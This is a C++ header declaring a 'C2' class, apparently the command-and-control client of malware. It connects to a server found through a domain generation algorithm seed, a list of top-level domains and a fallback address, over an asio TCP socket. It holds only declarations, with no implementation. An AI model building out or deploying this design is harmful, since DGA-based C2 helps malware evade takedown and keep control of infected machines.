#pragma once
#include "../types/types.h"
#include "../logging/logging.h"
#include "dga.h"
#include <asio.hpp>

class C2 {
public:
	
	C2::C2(const int dga, const char* fba, const stringvec& tlds, const char* port) : dgaseed{ dga }, fallbackaddr{ fba }, topleveldomains{ tlds }, port{ port }, mysocket{ asio_context } {}
	
	bool is_alive();
	bool find_and_connect();

private:

	std::string get_basedomain();

	int dgaseed = 0;
	const char* fallbackaddr;
	const char* port;
	stringvec topleveldomains;

	asio::io_context asio_context;
	asio::ip::tcp::socket mysocket;
};